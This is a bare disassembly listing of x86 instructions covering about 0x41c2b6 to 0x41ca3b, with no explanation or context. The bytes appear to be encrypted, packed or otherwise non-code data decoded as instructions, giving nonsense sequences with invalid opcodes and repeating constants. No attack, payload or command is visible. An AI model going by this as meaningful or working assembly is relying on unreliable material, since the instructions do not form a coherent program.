  41c2b6:	inc    edx
  41c2b7:	or     eax,0x5c348b77
  41c2bc:	es fwait
  41c2be:	test   ebx,0xc04e728c
  41c2c4:	lds    esp,FWORD PTR [edx+0x4f]
  41c2c7:	dec    esp
  41c2c8:	adc    BYTE PTR [esi],al
  41c2ca:	inc    eax
  41c2cb:	and    edx,DWORD PTR [edi-0x35]
  41c2ce:	dec    eax
  41c2cf:	add    eax,0x412ea8de
  41c2d4:	inc    BYTE PTR [ebp+eax*2+0x41]
  41c2d8:	arpl   WORD PTR [edx+0x40],bx
  41c2db:	rol    BYTE PTR [ebx+eax*2-0x17],0x65
  41c2e0:	inc    eax
  41c2e1:	test   eax,0x40cc0005
  41c2e6:	inc    ecx
  41c2e7:	inc    eax
  41c2e8:	inc    ebx
  41c2e9:	bound  esp,QWORD PTR ds:0x41400043
  41c2ef:	add    BYTE PTR [eax],al
  41c2f1:	add    eax,0x43624062
  41c2f6:	inc    ecx
  41c2f7:	inc    eax
  41c2f8:	inc    eax
  41c2f9:	inc    eax
  41c2fa:	add    eax,0x40624340
  41c2ff:	add    eax,0x40664140
  41c304:	sub    DWORD PTR [ebx],edi
  41c306:	sub    al,0x22
  41c308:	cwde   
  41c309:	in     al,dx
  41c30a:	xchg   edx,eax
  41c30b:	call   0xf9663b5e
  41c310:	push   edx
  41c311:	bound  esp,QWORD PTR [ecx]
  41c313:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c314:	inc    eax
  41c315:	rcr    BYTE PTR [edx+0x3c],0xc9
  41c319:	dec    esp
  41c31a:	add    eax,0x9d21113b
  41c31f:	test   al,0x43
  41c321:	add    BYTE PTR ds:0x41107840,al
  41c327:	bound  eax,QWORD PTR [eax+0x40]
  41c32a:	sldt   WORD PTR [eax-0x34]
  41c32e:	js     0x41c392
  41c330:	add    eax,0x40664143
  41c335:	inc    ebx
  41c336:	add    BYTE PTR [ecx+0x5],al
  41c339:	js     0x41c37b
  41c33b:	bound  eax,QWORD PTR [eax+0x0]
  41c33e:	inc    eax
  41c33f:	inc    edx
  41c340:	xchg   DWORD PTR [di+0x4833],eax
  41c345:	inc    esp
  41c346:	adc    BYTE PTR [ebx-0x27],al
  41c349:	inc    edi
  41c34a:	pop    esi
  41c34b:	ror    al,cl
  41c34d:	sub    al,0x48
  41c34f:	mov    esi,0x411a4362
  41c354:	cmp    DWORD PTR [edx],esp
  41c356:	inc    edx
  41c357:	jno    0x41c359
  41c359:	and    ecx,DWORD PTR [ebx+0x6251ea62]
  41c35f:	xchg   edx,eax
  41c360:	inc    ecx
  41c361:	inc    ebx
  41c362:	inc    eax
  41c363:	inc    eax
  41c364:	add    eax,0x434162
  41c369:	inc    eax
  41c36a:	add    BYTE PTR [edx+0x5],ah
  41c36d:	inc    eax
  41c36e:	adc    BYTE PTR [edx+0x40],ah
  41c371:	inc    ebx
  41c372:	inc    ecx
  41c373:	add    eax,0x4340
  41c378:	add    eax,0x404162
  41c37d:	add    BYTE PTR [eax+0x43],al
  41c380:	inc    eax
  41c381:	add    eax,0x42624c40
  41c386:	inc    edi
  41c387:	popf   
  41c388:	int3   
  41c389:	lds    eax,FWORD PTR [eax+0x3c]
  41c38c:	pop    es
  41c38d:	sub    eax,eax
  41c38f:	inc    esp
  41c390:	retf   
  41c391:	push   ecx
  41c392:	inc    ebx
  41c393:	ins    DWORD PTR es:[edi],dx
  41c394:	jg     0x41c3f8
  41c396:	xor    ebp,DWORD PTR [edx+ecx*2]
  41c399:	idiv   DWORD PTR [eax+0x5a40e263]
  41c39f:	and    BYTE PTR [ecx],cl
  41c3a1:	inc    ecx
  41c3a2:	cmp    eax,0xc336d1a8
  41c3a7:	dec    eax
  41c3a8:	addr16 inc eax
  41c3aa:	add    BYTE PTR [eax],al
  41c3ac:	inc    ecx
  41c3ad:	inc    ebx
  41c3ae:	add    eax,0x41784062
  41c3b3:	inc    eax
  41c3b4:	inc    eax
  41c3b5:	add    BYTE PTR [edi],cl
  41c3b7:	bound  eax,QWORD PTR [ebx+0x0]
  41c3ba:	add    eax,0x25006240
  41c3bf:	inc    eax
  41c3c0:	add    eax,0x40254143
  41c3c5:	add    eax,0x43620000
  41c3ca:	rcl    DWORD PTR [eax],0x6a
  41c3cd:	dec    esp
  41c3ce:	push   ecx
  41c3cf:	popf   
  41c3d0:	dec    eax
  41c3d1:	mov    esp,0x40a24c49
  41c3d6:	retf   0x4744
  41c3d9:	imul   esi,DWORD PTR [eax*1+0x2c6f2306],0xcb46f721
  41c3e4:	cmp    ch,BYTE PTR [edx]
  41c3e6:	push   eax
  41c3e7:	push   ds
  41c3e8:	jmp    0xa185cf47
  41c3ed:	inc    eax
  41c3ee:	rcl    ch,0x35
  41c3f1:	ror    DWORD PTR [ebp+eiz*2+0x41],1
  41c3f5:	and    eax,0xf7a8452c
  41c3fa:	arpl   WORD PTR [ebx+0x0],ax
  41c3fd:	add    BYTE PTR [eax],al
  41c3ff:	inc    ecx
  41c400:	inc    eax
  41c401:	bound  esp,QWORD PTR [esi+0x0]
  41c404:	inc    eax
  41c405:	add    eax,0x5400000
  41c40a:	inc    ecx
  41c40b:	inc    eax
  41c40c:	inc    eax
  41c40d:	bound  esp,QWORD PTR ds:0x25050043
  41c413:	inc    ecx
  41c414:	inc    ebx
  41c415:	inc    eax
  41c416:	test   BYTE PTR [eax+0x0],al
  41c419:	bound  ebx,QWORD PTR [eax+0x62]
  41c41c:	inc    ecx
  41c41d:	inc    eax
  41c41e:	int3   
  41c41f:	mov    dl,0x4c
  41c421:	dec    edx
  41c422:	inc    BYTE PTR [ebx+0x43]
  41c425:	pop    eax
  41c426:	bound  ebp,QWORD PTR [eax]
  41c428:	inc    eax
  41c429:	ror    BYTE PTR [eax+0x2a],0xbd
  41c42d:	xor    al,0x4
  41c42f:	xchg   esi,eax
  41c430:	pusha  
  41c431:	cmc    
  41c432:	cmp    al,0x43
  41c434:	addr16 inc esp
  41c436:	xor    BYTE PTR [ecx],dh
  41c438:	cld    
  41c439:	and    DWORD PTR [edx+ebp*1],ebx
  41c43c:	mov    al,ds:0x40776210
  41c441:	inc    eax
  41c442:	int    0x44
  41c444:	rol    BYTE PTR [ebx+0x28],0x6b
  41c448:	xor    eax,0x62102017
  41c44d:	inc    eax
  41c44e:	inc    ecx
  41c44f:	and    eax,0x40000500
  41c454:	inc    ebx
  41c455:	add    eax,0x40624041
  41c45a:	inc    ebx
  41c45b:	add    eax,0x43402541
  41c460:	bound  eax,QWORD PTR [eax+0x43]
  41c463:	int3   
  41c464:	inc    eax
  41c465:	bound  eax,QWORD PTR [eax]
  41c467:	inc    ecx
  41c468:	inc    eax
  41c469:	inc    eax
  41c46a:	add    eax,0x3e620905
  41c46f:	ins    BYTE PTR es:[edi],dx
  41c470:	aas    
  41c471:	inc    eax
  41c472:	push   es
  41c473:	dec    ah
  41c475:	adc    al,0x15
  41c477:	xor    al,0x5a
  41c479:	das    
  41c47a:	rol    BYTE PTR [edx+eiz*2+0x74],0xa8
  41c47f:	and    BYTE PTR [esi-0x56d3cb98],0x62
  41c486:	pop    edx
  41c487:	lds    edx,FWORD PTR [edx-0x47e5d0c0]
  41c48d:	inc    edx
  41c48e:	xor    cl,BYTE PTR [eax+eax*1+0x10]
  41c492:	rol    ch,0x5
  41c495:	inc    ebx
  41c496:	adc    DWORD PTR [esi+eiz*4-0x34a8c6bc],eax
  41c49d:	mov    ebp,0x625bc3ac
  41c4a2:	inc    eax
  41c4a3:	and    eax,0x5406600
  41c4a8:	inc    ebx
  41c4a9:	inc    ecx
  41c4aa:	inc    eax
  41c4ab:	inc    eax
  41c4ac:	inc    ebx
  41c4ad:	add    BYTE PTR [eax],al
  41c4af:	add    BYTE PTR [edx-0x34],ah
  41c4b2:	inc    eax
  41c4b3:	add    eax,0x40004041
  41c4b8:	inc    ecx
  41c4b9:	int3   
  41c4ba:	add    BYTE PTR [ebx-0x7c],al
  41c4bd:	add    eax,0x5406240
  41c4c2:	bound  eax,QWORD PTR [esi+0x40]
  41c4c5:	dec    BYTE PTR [eax+0x6c]
  41c4c8:	or     DWORD PTR [ebp-0x5b],eax
  41c4cb:	pusha  
  41c4cc:	push   esp
  41c4cd:	inc    esp
  41c4ce:	inc    edx
  41c4cf:	loope  0x41c53b
  41c4d1:	xor    dh,cl
  41c4d3:	inc    eax
  41c4d4:	xor    ch,BYTE PTR [edx+edx*8]
  41c4d7:	and    BYTE PTR [esp+esi*1+0x53],ah
  41c4db:	dec    edx
  41c4dc:	pop    eax
  41c4dd:	sbb    BYTE PTR [eax-0x1c9d9c09],al
  41c4e3:	inc    eax
  41c4e4:	sar    BYTE PTR [edx+0x64],0x5f
  41c4e8:	mov    al,0x1d
  41c4ea:	sbb    eax,0x69a97e4d
  41c4ef:	popf   
  41c4f0:	mov    WORD PTR gs:[esi+0x401c7960],es
  41c4f7:	bound  ebx,QWORD PTR [eax+0x41]
  41c4fa:	add    eax,0x40404340
  41c4ff:	inc    ebx
  41c500:	inc    eax
  41c501:	test   BYTE PTR [eax],al
  41c503:	add    eax,0x40624041
  41c508:	inc    eax
  41c509:	add    BYTE PTR [edx+0x5],ah
  41c50c:	inc    ebx
  41c50d:	add    BYTE PTR [eax+0x78],al
  41c510:	inc    ecx
  41c511:	add    BYTE PTR [eax+0x41],bl
  41c514:	bound  ebp,QWORD PTR [eax]
  41c516:	inc    edx
  41c517:	xchg   edx,eax
  41c518:	arpl   WORD PTR [ebp+0x40],ax
  41c51b:	inc    eax
  41c51c:	mov    ah,0xc3
  41c51e:	inc    ebx
  41c51f:	mov    edi,0x2c7e4a18
  41c524:	bound  ebp,QWORD PTR ds:0x5de46bbd
  41c52a:	inc    eax
  41c52b:	adc    esp,DWORD PTR [ebx-0x43]
  41c52e:	dec    eax
  41c52f:	sahf   
  41c530:	bound  ebp,QWORD PTR [ebp+0x4c9c4162]
  41c536:	pusha  
  41c537:	push   edx
  41c538:	inc    eax
  41c539:	or     eax,DWORD PTR [eax+0x4d]
  41c53c:	inc    esp
  41c53d:	pop    edi
  41c53e:	inc    ecx
  41c53f:	shr    BYTE PTR [edx],1
  41c541:	pop    ecx
  41c542:	jnp    0x41c584
  41c544:	test   BYTE PTR [eax],al
  41c546:	int3   
  41c547:	bound  eax,QWORD PTR ds:0xcc840f41
  41c54d:	inc    ebx
  41c54e:	add    BYTE PTR [eax+0x0],al
  41c551:	inc    eax
  41c552:	inc    eax
  41c553:	inc    eax
  41c554:	int3   
  41c555:	add    BYTE PTR ds:0x62404341,al
  41c55b:	pop    eax
  41c55c:	add    BYTE PTR [ebx+0x40],al
  41c55f:	bound  ecx,QWORD PTR [edi]
  41c561:	inc    eax
  41c562:	inc    eax
  41c563:	sub    al,0xdd
  41c565:	and    al,0x48
  41c567:	pop    edx
  41c568:	fild   WORD PTR [eax+0x7c]
  41c56b:	adc    al,0x51
  41c56d:	push   ecx
  41c56e:	sub    eax,0x16388686
  41c573:	(bad)
  41c576:	xor    eax,0x9340ff0c
  41c57b:	inc    ecx
  41c57c:	push   0xbab6b68
  41c581:	inc    eax
  41c582:	inc    edx
  41c583:	out    dx,al
  41c584:	retf   
  41c585:	add    dl,BYTE PTR [ecx+0x3000b8]
  41c58b:	add    BYTE PTR [eax+0x40],al
  41c58e:	cmovno eax,DWORD PTR ds:0x40056243
  41c595:	int3   
  41c596:	add    ah,cl
  41c598:	inc    eax
  41c599:	inc    eax
  41c59a:	bound  eax,QWORD PTR [ecx+0x0]
  41c59d:	add    BYTE PTR [edi],cl
  41c59f:	inc    ebx
  41c5a0:	inc    eax
  41c5a1:	inc    eax
  41c5a2:	add    BYTE PTR [ecx+0x43],al
  41c5a5:	add    eax,0x40256240
  41c5aa:	bound  eax,QWORD PTR [eax]
  41c5ac:	jle    0x41c5f2
  41c5ae:	push   edi
  41c5af:	test   BYTE PTR [edx+0x5],ah
  41c5b2:	rol    DWORD PTR [eax-0x9],1
  41c5b5:	sub    al,0xd9
  41c5b7:	inc    ebx
  41c5b8:	int    0xcb
  41c5ba:	sub    esi,DWORD PTR [ebx+0x40]
  41c5bd:	adc    dh,BYTE PTR [edi+ebp*4]
  41c5c0:	retf   0x4645
  41c5c3:	inc    eax
  41c5c4:	sub    eax,0x5355ed5
  41c5c9:	add    ah,cl
  41c5cb:	inc    eax
  41c5cc:	inc    ecx
  41c5cd:	inc    eax
  41c5ce:	inc    ebx
  41c5cf:	bound  esp,QWORD PTR ds:0x41400043
  41c5d5:	add    BYTE PTR [eax],al
  41c5d7:	add    eax,0x43624062
  41c5dc:	inc    ecx
  41c5dd:	inc    eax
  41c5de:	inc    eax
  41c5df:	inc    eax
  41c5e0:	add    eax,0x40624340
  41c5e5:	add    eax,0x40664140
  41c5ea:	cmp    eax,0x407aa743
  41c5ef:	pop    ecx
  41c5f0:	test   al,0x62
  41c5f2:	sbb    al,0x43
  41c5f4:	mov    al,BYTE PTR [eax+0x34]
  41c5f7:	out    dx,al
  41c5f8:	push   edx
  41c5f9:	mov    eax,ds:0x28aafcbc
  41c5fe:	jmp    0x41c644
  41c600:	daa    
  41c601:	in     al,dx
  41c602:	test   DWORD PTR [ecx-0x1c],ebp
  41c605:	inc    eax
  41c606:	inc    eax
  41c607:	sub    al,0xe3
  41c609:	bound  esp,QWORD PTR [edx+0x5a]
  41c60c:	loope  0x41c64e
  41c60e:	jl     0x41c620
  41c610:	stos   DWORD PTR es:[edi],eax
  41c611:	mov    eax,0x3446d045
  41c616:	loop   0x41c5e5
  41c618:	inc    edx
  41c619:	inc    ecx
  41c61a:	inc    edi
  41c61b:	add    eax,0x87be40f9
  41c620:	inc    ecx
  41c621:	sbb    DWORD PTR [ebp-0x79],edi
  41c624:	lahf   
  41c625:	and    al,0xbf
  41c627:	loop   0x41c66c
  41c629:	add    BYTE PTR ds:0x41107840,al
  41c62f:	bound  eax,QWORD PTR [eax+0x40]
  41c632:	sldt   WORD PTR [eax-0x34]
  41c636:	js     0x41c69a
  41c638:	add    eax,0x40664143
  41c63d:	inc    ebx
  41c63e:	add    BYTE PTR [ecx+0x5],al
  41c641:	js     0x41c683
  41c643:	bound  eax,QWORD PTR [eax+0x0]
  41c646:	inc    eax
  41c647:	jecxz  0x41c69b
  41c649:	imul   ecx,DWORD PTR [eax+0x2f],0x79444040
  41c650:	dec    eax
  41c651:	adc    ebx,DWORD PTR [ebp-0x28]
  41c654:	sub    DWORD PTR [eax+0x2c],eax
  41c657:	cmp    BYTE PTR [ecx-0x40],al
  41c65a:	fbstp  TBYTE PTR [edi+0x40]
  41c65d:	pop    ebp
  41c65e:	push   cs
  41c65f:	bound  ebx,QWORD PTR [ecx]
  41c661:	bound  ecx,QWORD PTR [eax+ecx*2+0x2fc5b437]
  41c668:	push   ebx
  41c669:	or     eax,0x71407c8c
  41c66e:	and    BYTE PTR [ecx+0x43],al
  41c671:	inc    eax
  41c672:	inc    eax
  41c673:	add    eax,0x434162
  41c678:	inc    eax
  41c679:	add    BYTE PTR [edx+0x5],ah
  41c67c:	inc    eax
  41c67d:	adc    BYTE PTR [edx+0x40],ah
  41c680:	inc    ebx
  41c681:	inc    ecx
  41c682:	add    eax,0x4340
  41c687:	add    eax,0x404162
  41c68c:	add    BYTE PTR [eax+0x43],al
  41c68f:	inc    eax
  41c690:	add    eax,0x1258e34c
  41c695:	cmovo  edx,DWORD PTR [eax+0x62ab63fe]
  41c69c:	test   BYTE PTR [edi],0x6d
  41c69f:	inc    eax
  41c6a0:	inc    esp
  41c6a1:	popa   
  41c6a2:	inc    edx
  41c6a3:	ret    
  41c6a4:	gs xchg ebx,eax
  41c6a6:	inc    eax
  41c6a7:	and    al,0x2c
  41c6a9:	dec    eax
  41c6aa:	stos   DWORD PTR es:[edi],eax
  41c6ab:	cld    
  41c6ac:	mov    ah,0x37
  41c6ae:	xor    cl,dl
  41c6b0:	or     al,0x62
  41c6b2:	dec    eax
  41c6b3:	daa    
  41c6b4:	inc    ecx
  41c6b5:	cld    
  41c6b6:	inc    eax
  41c6b7:	inc    eax
  41c6b8:	aad    0x50
  41c6ba:	inc    edx
  41c6bb:	cmp    BYTE PTR [ebp+0x4b6525f0],ch
  41c6c1:	dec    esp
  41c6c2:	outs   dx,DWORD PTR es:[esi]
  41c6c4:	push   ebp
  41c6c5:	cmc    
  41c6c6:	inc    eax
  41c6c7:	test   esi,edi
  41c6c9:	jnp    0x41c6a3
  41c6cb:	or     ah,bl
  41c6cd:	jo     0x41c70f
  41c6cf:	add    BYTE PTR [eax],al
  41c6d1:	inc    ecx
  41c6d2:	inc    ebx
  41c6d3:	add    eax,0x41784062
  41c6d8:	inc    eax
  41c6d9:	inc    eax
  41c6da:	add    BYTE PTR [edi],cl
  41c6dc:	bound  eax,QWORD PTR [ebx+0x0]
  41c6df:	add    eax,0x25006240
  41c6e4:	inc    eax
  41c6e5:	add    eax,0x40254143
  41c6ea:	add    eax,0x24620000
  41c6ef:	inc    eax
  41c6f0:	inc    esp
  41c6f1:	dec    ecx
  41c6f2:	arpl   WORD PTR [eax+0x4405c43],bx
  41c6f8:	sub    al,0x41
  41c6fa:	jmp    0xa40:0xf58fe463
  41c701:	inc    eax
  41c702:	sub    BYTE PTR [eax],cl
  41c704:	js     0x41c740
  41c706:	sub    DWORD PTR [edi],ecx
  41c708:	int    0xd4
  41c70a:	push   esp
  41c70b:	inc    edx
  41c70c:	or     ecx,DWORD PTR [ebx+edi*4+0x48555048]
  41c713:	cmp    eax,0xcdf538a8
  41c718:	out    dx,al
  41c719:	loope  0x41c730
  41c71b:	stc    
  41c71c:	adc    al,BYTE PTR [edx+0x75]
  41c71f:	inc    eax
  41c720:	inc    esp
  41c721:	xor    eax,0x43cb
  41c726:	add    BYTE PTR [ecx+0x40],al
  41c729:	bound  esp,QWORD PTR [esi+0x0]
  41c72c:	inc    eax
  41c72d:	add    eax,0x5400000
  41c732:	inc    ecx
  41c733:	inc    eax
  41c734:	inc    eax
  41c735:	bound  esp,QWORD PTR ds:0x25050043
  41c73b:	inc    ecx
  41c73c:	inc    ebx
  41c73d:	inc    eax
  41c73e:	test   BYTE PTR [eax+0x0],al
  41c741:	bound  ebx,QWORD PTR [eax+0x62]
  41c744:	inc    ecx
  41c745:	inc    eax
  41c746:	or     BYTE PTR [ecx+0x74],al
  41c749:	mov    ecx,0x51d02c65
  41c74e:	cdq    
  41c74f:	inc    esp
  41c750:	mov    esi,DWORD PTR [ebp+0x51]
  41c753:	or     BYTE PTR [ebp+0x41],cl
  41c756:	xor    BYTE PTR gs:[ebp+0x43c540bf],ah
  41c75d:	rcl    BYTE PTR [esi],cl
  41c75f:	stos   DWORD PTR es:[edi],eax
  41c760:	cmp    eax,0x3b5d7ab9
  41c765:	mov    ah,0x12
  41c767:	pop    edx
  41c768:	jle    0x41c75b
  41c76a:	inc    eax
  41c76b:	(bad)  
  41c76c:	das    
  41c76d:	dec    edx
  41c76e:	or     BYTE PTR [ebp+0x48694076],cl
  41c774:	(bad)  
  41c775:	aam    0x9a
  41c777:	inc    ecx
  41c778:	les    edx,FWORD PTR [ebx+esi*1+0x3c]
  41c77c:	add    al,BYTE PTR [edx+0x10efc962]
  41c782:	bound  eax,QWORD PTR [eax+0x41]
  41c785:	and    eax,0x40000500
  41c78a:	inc    ebx
  41c78b:	add    eax,0x40624041
  41c790:	inc    ebx
  41c791:	add    eax,0x43402541
  41c796:	bound  eax,QWORD PTR [eax+0x43]
  41c799:	int3   
  41c79a:	inc    eax
  41c79b:	bound  eax,QWORD PTR [eax]
  41c79d:	inc    ecx
  41c79e:	inc    eax
  41c79f:	inc    eax
  41c7a0:	add    eax,0x6427005
  41c7a5:	dec    ecx
  41c7a6:	jnp    0x41c744
  41c7a8:	push   eax
  41c7a9:	std    
  41c7aa:	inc    eax
  41c7ab:	cs aad 0x21
  41c7ae:	push   ecx
  41c7af:	or     ecx,DWORD PTR ds:0x4be250ab
  41c7b5:	gs (bad) 
  41c7b7:	mov    ebp,0x413db3cb
  41c7bc:	(bad)  
  41c7bd:	xor    al,0x4f
  41c7bf:	arpl   WORD PTR [eax+ebp*8+0x78],ax
  41c7c3:	inc    eax
  41c7c4:	inc    esp
  41c7c5:	bound  eax,QWORD PTR [eax+0x25]
  41c7c8:	add    BYTE PTR [esi+0x40],ah
  41c7cb:	add    eax,0x40404143
  41c7d0:	inc    ebx
  41c7d1:	add    BYTE PTR [eax],al
  41c7d3:	add    BYTE PTR [edx-0x34],ah
  41c7d6:	inc    eax
  41c7d7:	add    eax,0x40004041
  41c7dc:	inc    ecx
  41c7dd:	int3   
  41c7de:	add    BYTE PTR [ebx-0x7c],al
  41c7e1:	add    eax,0x5406240
  41c7e6:	bound  esp,QWORD PTR [eax+0x42]
  41c7e9:	inc    ecx
  41c7ea:	inc    ebx
  41c7eb:	int    0xb6
  41c7ed:	es sub al,0xa1
  41c7f0:	xchg   edx,eax
  41c7f1:	xor    BYTE PTR [ecx+0x3d],cl
  41c7f4:	mov    ebx,0x4cc304cb
  41c7f9:	or     esp,DWORD PTR [eax]
  41c7fb:	inc    ebx
  41c7fc:	je     0x41c83e
  41c7fe:	int    0x50
  41c800:	push   edx
  41c801:	mov    esp,0x605b773e
  41c806:	and    BYTE PTR ds:0xe15562fe,cl
  41c80c:	adc    BYTE PTR [ecx+0x40],0x62
  41c810:	pop    eax
  41c811:	inc    ecx
  41c812:	add    eax,0x40404340
  41c817:	inc    ebx
  41c818:	inc    eax
  41c819:	test   BYTE PTR [eax],al
  41c81b:	add    eax,0x40624041
  41c820:	inc    eax
  41c821:	add    BYTE PTR [edx+0x5],ah
  41c824:	inc    ebx
  41c825:	add    BYTE PTR [eax+0x78],al
  41c828:	inc    ecx
  41c829:	add    BYTE PTR [eax+0x41],bl
  41c82c:	(bad)  
  41c82d:	dec    bl
  41c82f:	add    BYTE PTR [edi],dl
  41c831:	or     eax,0x44407164
  41c836:	jbe    0x41c7bd
  41c838:	in     al,0x92
  41c83a:	mov    ch,0x42
  41c83c:	sub    ebp,DWORD PTR [esi*1+0x59636362]
  41c843:	lock dec ebx
  41c845:	add    al,BYTE PTR [edi+0x52]
  41c848:	retf   
  41c849:	push   ecx
  41c84a:	add    DWORD PTR [edx+0x40],edi
  41c84d:	adc    BYTE PTR [ecx+0x4e],al
  41c850:	inc    eax
  41c851:	test   BYTE PTR [eax],al
  41c853:	int3   
  41c854:	bound  eax,QWORD PTR ds:0xcc840f41
  41c85a:	inc    ebx
  41c85b:	add    BYTE PTR [eax+0x0],al
  41c85e:	inc    eax
  41c85f:	inc    eax
  41c860:	inc    eax
  41c861:	int3   
  41c862:	add    BYTE PTR ds:0x62404341,al
  41c868:	pop    eax
  41c869:	add    BYTE PTR [ebx+0x40],al
  41c86c:	bound  ecx,QWORD PTR [edi]
  41c86e:	inc    eax
  41c86f:	mov    edi,0x329fe734
  41c874:	lods   eax,DWORD PTR ds:[esi]
  41c875:	cmp    al,0xe1
  41c877:	mov    edi,0xea363a40
  41c87c:	sbb    dl,ch
  41c87e:	dec    edi
  41c87f:	jmp    0x41c8d1
  41c881:	fisub  WORD PTR [ebx+0x65]
  41c884:	int3   
  41c885:	inc    esp
  41c886:	dec    esp
  41c887:	sahf   
  41c888:	cmp    eax,0x624412b0
  41c88d:	jnp    0x41c8f8
  41c88f:	inc    edx
  41c890:	ret    
  41c891:	mov    al,0x3d
  41c893:	imul   edx,ebp,0x400000ac
  41c899:	inc    eax
  41c89a:	cmovno eax,DWORD PTR ds:0x40056243
  41c8a1:	int3   
  41c8a2:	add    ah,cl
  41c8a4:	inc    eax
  41c8a5:	inc    eax
  41c8a6:	bound  eax,QWORD PTR [ecx+0x0]
  41c8a9:	add    BYTE PTR [edi],cl
  41c8ab:	inc    ebx
  41c8ac:	inc    eax
  41c8ad:	inc    eax
  41c8ae:	add    BYTE PTR [ecx+0x43],al
  41c8b1:	add    eax,0x40256240
  41c8b6:	bound  eax,QWORD PTR [eax]
  41c8b8:	dec    edx
  41c8b9:	inc    edi
  41c8ba:	push   ecx
  41c8bb:	push   edi
  41c8bc:	jl     0x41c92d
  41c8be:	dec    esi
  41c8bf:	add    eax,0xabc9dc34
  41c8c4:	jb     0x41c917
  41c8c6:	std    
  41c8c7:	retf   
  41c8c8:	mov    eax,0x9faabc22
  41c8cd:	cmp    eax,DWORD PTR [eax+edi*4+0x2c]
  41c8d1:	hlt    
  41c8d2:	adc    eax,0x2c437b8d
  41c8d7:	adc    eax,0xfecb6363
  41c8dc:	pop    ds
  41c8dd:	addr16 jle 0x41c8ab
  41c8e0:	or     bl,BYTE PTR [eax]
  41c8e2:	dec    esp
  41c8e3:	jge    0x41c957
  41c8e5:	inc    ebp
  41c8e6:	int    0x7
  41c8e8:	xor    al,0x50
  41c8ea:	add    eax,0x4140cc00
  41c8ef:	inc    eax
  41c8f0:	inc    ebx
  41c8f1:	bound  esp,QWORD PTR ds:0x41400043
  41c8f7:	add    BYTE PTR [eax],al
  41c8f9:	add    eax,0x43624062
  41c8fe:	inc    ecx
  41c8ff:	inc    eax
  41c900:	inc    eax
  41c901:	inc    eax
  41c902:	add    eax,0x40624340
  41c907:	add    eax,0x40664140
  41c90c:	dec    ecx
  41c90d:	mov    ah,0x1f
  41c90f:	add    eax,0x62803420
  41c914:	inc    eax
  41c915:	(bad)  
  41c916:	jnp    0x41c959
  41c918:	inc    BYTE PTR [eax-0x3b]
  41c91b:	test   al,0x10
  41c91d:	push   esi
  41c91e:	cmp    DWORD PTR [edx],esi
  41c920:	inc    esp
  41c921:	inc    eax
  41c922:	inc    ecx
  41c923:	sbb    BYTE PTR [ebx-0x40],ch
  41c926:	dec    ebx
  41c927:	inc    ebx
  41c928:	sub    al,0x1
  41c92a:	inc    ebp
  41c92b:	push   ecx
  41c92c:	in     al,0xe5
  41c92e:	rcr    DWORD PTR [esi],1
  41c930:	jl     0x41c957
  41c932:	call   0x295ecba2
  41c937:	inc    esp
  41c938:	(bad)
  41c93b:	lods   al,BYTE PTR ds:[esi]
  41c93c:	test   DWORD PTR [edx-0x9],ebx
  41c93f:	inc    DWORD PTR [ebx+0x0]
  41c942:	add    eax,0x41107840
  41c947:	bound  eax,QWORD PTR [eax+0x40]
  41c94a:	sldt   WORD PTR [eax-0x34]
  41c94e:	js     0x41c9b2
  41c950:	add    eax,0x40664143
  41c955:	inc    ebx
  41c956:	add    BYTE PTR [ecx+0x5],al
  41c959:	js     0x41c99b
  41c95b:	bound  eax,QWORD PTR [eax+0x0]
  41c95e:	inc    eax
  41c95f:	dec    esi
  41c960:	int    0x1b
  41c962:	or     eax,0x3495f364
  41c967:	(bad)  
  41c968:	jl     0x41c94b
  41c96a:	sub    bh,BYTE PTR [eax+0x4462b49b]
  41c970:	ret    
  41c971:	fs es or eax,0x2c403f15
  41c978:	mov    eax,0x40cb5d12
  41c97d:	cmp    BYTE PTR ds:0x35e80d7a,ah
  41c983:	nop
  41c984:	fld    QWORD PTR ds:0x62cbd56e
  41c98a:	inc    eax
  41c98b:	mov    edi,0xdc40579b
  41c990:	mov    eax,0xdd42bc30
  41c995:	dec    ebx
  41c996:	ins    DWORD PTR es:[edi],dx
  41c997:	xchg   esi,eax
  41c998:	inc    ecx
  41c999:	inc    ebx
  41c99a:	inc    eax
  41c99b:	inc    eax
  41c99c:	add    eax,0x434162
  41c9a1:	inc    eax
  41c9a2:	add    BYTE PTR [edx+0x5],ah
  41c9a5:	inc    eax
  41c9a6:	adc    BYTE PTR [edx+0x40],ah
  41c9a9:	inc    ebx
  41c9aa:	inc    ecx
  41c9ab:	add    eax,0x4340
  41c9b0:	add    eax,0x404162
  41c9b5:	add    BYTE PTR [eax+0x43],al
  41c9b8:	inc    eax
  41c9b9:	add    eax,0x6f416445
  41c9be:	int3   
  41c9bf:	adc    DWORD PTR [eax+0x64],eax
  41c9c2:	inc    eax
  41c9c3:	bound  ebp,QWORD PTR [edx+0x22020e10]
  41c9c9:	inc    esp
  41c9ca:	aam    0x73
  41c9cc:	sub    BYTE PTR [edx-0x19],ah
  41c9cf:	adc    ecx,DWORD PTR [edx+0x2c]
  41c9d2:	nop
  41c9d3:	loopne 0x41c9d5
  41c9d5:	shr    BYTE PTR [esi],0x41
  41c9d8:	inc    eax
  41c9d9:	js     0x41ca3e
  41c9db:	inc    edx
  41c9dc:	inc    eax
  41c9dd:	retf   
  41c9de:	xor    BYTE PTR [ecx+0x11],dh
  41c9e1:	int    0xb8
  41c9e3:	xor    eax,0x1243bf40
  41c9e8:	pop    ss
  41c9e9:	and    BYTE PTR ds:0xbbbf0f43,al
  41c9ef:	adc    DWORD PTR [eax+0x0],eax
  41c9f2:	add    BYTE PTR [ecx+0x43],al
  41c9f5:	add    eax,0x41784062
  41c9fa:	inc    eax
  41c9fb:	inc    eax
  41c9fc:	add    BYTE PTR [edi],cl
  41c9fe:	bound  eax,QWORD PTR [ebx+0x0]
  41ca01:	add    eax,0x25006240
  41ca06:	inc    eax
  41ca07:	add    eax,0x40254143
  41ca0c:	add    eax,0x4e620000
  41ca11:	dec    bl
  41ca13:	into   
  41ca14:	xchg   edi,eax
  41ca15:	stos   DWORD PTR es:[edi],eax
  41ca16:	out    0x4c,eax
  41ca18:	inc    esp
  41ca19:	inc    esp
  41ca1a:	dec    ecx
  41ca1b:	mov    esp,0x1145f962
  41ca20:	and    al,0x2c
  41ca22:	stos   DWORD PTR es:[edi],eax
  41ca23:	or     eax,0x49524351
  41ca28:	data16 jbe 0x41ca6d
  41ca2b:	retf   
  41ca2c:	les    eax,FWORD PTR [eax]
  41ca2e:	retf   0x4233
  41ca31:	lds    ebx,FWORD PTR ds:0x56ec069b
  41ca37:	aas    
  41ca38:	sub    DWORD PTR [edx-0x74],eax
  41ca3b:	stos   DWORD PTR es:[edi],eax
